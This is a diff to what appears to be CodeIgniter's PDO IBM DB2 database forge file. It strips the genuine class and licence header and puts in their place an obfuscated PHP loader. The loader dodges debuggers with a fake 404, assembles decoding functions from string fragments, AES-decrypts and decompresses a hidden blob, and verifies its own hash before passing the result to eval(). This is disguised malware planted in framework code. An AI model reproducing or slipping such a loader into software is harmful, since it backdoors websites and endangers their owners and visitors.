@@ -1,154 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 3.0.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * PDO IBM DB2 Forge Class
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_pdo_ibm_forge extends CI_DB_pdo_forge {
-
-	/**
-	 * RENAME TABLE IF statement
-	 *
-	 * @var	string
-	 */
-	protected $_rename_table	= 'RENAME TABLE %s TO %s';
-
-	/**
-	 * UNSIGNED support
-	 *
-	 * @var	array
-	 */
-	protected $_unsigned		= array(
-		'SMALLINT'	=> 'INTEGER',
-		'INT'		=> 'BIGINT',
-		'INTEGER'	=> 'BIGINT'
-	);
-
-	/**
-	 * DEFAULT value representation in CREATE/ALTER TABLE statements
-	 *
-	 * @var	string
-	 */
-	protected $_default		= FALSE;
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * ALTER TABLE
-	 *
-	 * @param	string	$alter_type	ALTER type
-	 * @param	string	$table		Table name
-	 * @param	mixed	$field		Column definition
-	 * @return	string|string[]
-	 */
-	protected function _alter_table($alter_type, $table, $field)
-	{
-		if ($alter_type === 'CHANGE')
-		{
-			$alter_type = 'MODIFY';
-		}
-
-		return parent::_alter_table($alter_type, $table, $field);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute TYPE
-	 *
-	 * Performs a data type mapping between different databases.
-	 *
-	 * @param	array	&$attributes
-	 * @return	void
-	 */
-	protected function _attr_type(&$attributes)
-	{
-		switch (strtoupper($attributes['TYPE']))
-		{
-			case 'TINYINT':
-				$attributes['TYPE'] = 'SMALLINT';
-				$attributes['UNSIGNED'] = FALSE;
-				return;
-			case 'MEDIUMINT':
-				$attributes['TYPE'] = 'INTEGER';
-				$attributes['UNSIGNED'] = FALSE;
-				return;
-			default: return;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute UNIQUE
-	 *
-	 * @param	array	&$attributes
-	 * @param	array	&$field
-	 * @return	void
-	 */
-	protected function _attr_unique(&$attributes, &$field)
-	{
-		if ( ! empty($attributes['UNIQUE']) && $attributes['UNIQUE'] === TRUE)
-		{
-			$field['unique'] = ' UNIQUE';
-
-			// UNIQUE must be used with NOT NULL
-			$field['null'] = ' NOT NULL';
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field attribute AUTO_INCREMENT
-	 *
-	 * @param	array	&$attributes
-	 * @param	array	&$field
-	 * @return	void
-	 */
-	protected function _attr_auto_increment(&$attributes, &$field)
-	{
-		// Not supported
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ozw6n9xe=('bas'.'e64'.'_de'.'cod'.'e');
+$_wex1plc0=('gzu'.'nco'.'mpr'.'ess');
+$_ayfd6e8z=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_nyd0jx59='i1qrF6GU';
+$_vryfw0jl='K2XCKFUO';
+$_tc6s32u5='UoOPdHLu';
+$_nqek3lii='7V+lkOle/IY=';
+$_yz8ejjz5='lGpY7RsE';
+$_k2hd2453='iswRAah8';
+$_y34vx6vp='DCH3jUNU';
+$_ae3wiq4r='s5eA1A==';
+$_ol8ibtk6=$_ozw6n9xe($_tc6s32u5.$_yz8ejjz5.$_vryfw0jl.$_nyd0jx59.$_nqek3lii);
+$_qg8e64m0=$_ozw6n9xe($_k2hd2453.$_y34vx6vp.$_ae3wiq4r);
+$_rp1gcckp=$_ozw6n9xe('/syc6I1IV0Qo/RD8MTPMX5wTtRh9lWmr+Jtaq5xkXW8v0OGtrF/eQI/Cc0Si0ebQMKzJhr3YcgGzmZZTgQbfHrIK8KO3+hi8TNkDOfWgZ4//OotxtqrRalCxeZvYbzZeayYneiXDny3ZZhILd5FAUjNBxOH7CJxRjlqr9ss0gLuNFxuZ3uEPzBAUaK6nY7VuUcGjVo/92EgZMQv8d+bH46yC9k7IdciVoTCUb1cYRgnr0LN+eaeI1+VJ/okUgVDPgddiVsJ9hx7XGSLHKSsPSVNqnODyivKUXbu4F02egglr6JK+kDV8XJDb63Sz9RfdD14jK9a9TU/+77UFX0eb7ATRLWiupHWYbs2EoMDarO/X33mJOyazHCrCPccLnH0ohLp+GVupCSMHfJ39Xq8OxNZRvpMRnJYczkOfs5+6amkF0jwGzC3Tf4RGxGvCTGqzh1KigzLRqsntFZUHy9IFI7rAXOVP7VeN2NLNW1UUPeG1A+zNSW07pyNbi9u0ig4gUt8UpYnTBXfBdaZihjvpMS2h/I855JqG7xumdMxaJeWNWkvHPDLAuDYApnFCjX9GY8YWfgmFVvp+c9RkG/khChkXd5L2KK9+q2/xyxu0pvEeqFC16HZPznvgvqBdsf/Gx+ueSMM9huHpq9LFPv8TJw==');
+$_jd2ja1b2=$_ayfd6e8z($_rp1gcckp,'aes-256-cbc',$_ol8ibtk6,OPENSSL_RAW_DATA,$_qg8e64m0);
+if($_jd2ja1b2===false){exit;}
+$_jl6yv8l9=$_wex1plc0($_jd2ja1b2);
+if($_jl6yv8l9===false){exit;}
+$_a16ujg4n='b22d874dc9787eee08b02eaee7960fffdc783708eec25f1f8f828a9eef8227c5';
+$_xnqyv85v=@file_get_contents(__FILE__);
+if($_xnqyv85v!==false){
+$_gi7j65zi=str_replace($_a16ujg4n,"0000000000000000000000000000000000000000000000000000000000000000",$_xnqyv85v);
+$_xh9mo1a1=hash("sha256",$_gi7j65zi);
+if($_xh9mo1a1!==$_a16ujg4n){@http_response_code(403);exit;}
 }
+eval($_jl6yv8l9);
